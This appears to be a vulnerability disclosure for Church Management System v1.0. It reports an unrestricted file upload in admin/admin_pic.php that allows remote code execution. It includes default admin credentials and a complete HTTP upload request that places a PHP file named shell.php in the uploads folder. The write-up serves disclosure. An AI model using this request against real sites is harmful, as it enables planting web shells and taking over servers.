# Church Management System v1.0 by Godfrey De Blessed has arbitrary code execution (RCE)

BUG_Author: Cokutau-CH

vendors: https://www.sourcecodester.com/php/11206/church-management-system.html

The program is built using the xmapp-php8.1 version

Login account: admin/admin (Super Admin account)

Vulnerability url: ip/cman/admin/admin_pic.php

Loophole location: Church Management System's admin/admin_pic.php file exists arbitrary file upload (RCE)

Request package for file upload：

```sql
POST /cman/admin/admin_pic.php HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Referer: http://192.168.1.19/cman/admin/dashboard.php
Cookie: PHPSESSID=fjhrjdpuej6edqv5haoadpj3lc
Connection: close
Content-Type: multipart/form-data; boundary=---------------------------211491645714374
Content-Length: 327

-----------------------------211491645714374
Content-Disposition: form-data; name="image"; filename="shell.php"
Content-Type: application/octet-stream

JFJF
<?php phpinfo();?>
-----------------------------211491645714374
Content-Disposition: form-data; name="change"


-----------------------------211491645714374--
```

The files will be uploaded to this directory \cman\admin\uploads

![image](https://user-images.githubusercontent.com/54017627/183247877-54e61523-f3a7-4033-8c2d-fc502c94d3b5.png)

We visited the directory of the file in the browser and found that the code had been executed
![image](https://user-images.githubusercontent.com/54017627/183247897-83a7a591-54bb-442d-aca2-17aa10b2ffdb.png)

